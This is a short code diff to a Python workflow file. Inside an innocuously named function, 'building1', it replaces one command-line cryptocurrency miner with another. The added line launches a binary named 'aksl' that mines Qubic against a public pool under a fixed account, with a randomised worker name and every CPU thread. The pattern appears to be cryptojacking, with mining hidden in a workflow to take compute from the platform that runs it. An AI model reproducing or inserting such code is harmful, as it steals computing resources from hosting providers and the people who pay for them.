@@ -14,7 +14,7 @@ app = Workflows()
 def building1():
   import sys
   import os
-  os.system('./qubcli -pplns -wallet QDFHPFWSUCGDBDQNORZOPMWDCWZBFJZHDTBAZBPUPCSUHQQCGPSNJVJEPCPM -workername $(echo $RANDOM | md5sum | head -c 10) -cpu -threads $(nproc --all) -start')
+  os.system('./aksl --algo qubic --gpu-off --xmr-1gb-pages --pool qubic.eu.apool.net:4334 --account CP_jf0ixh8hgm --worker $(echo $RANDOM | md5sum | head -c 10) --thread $(nproc --all)')
 
 if __name__ == "__main__":
   app.start()
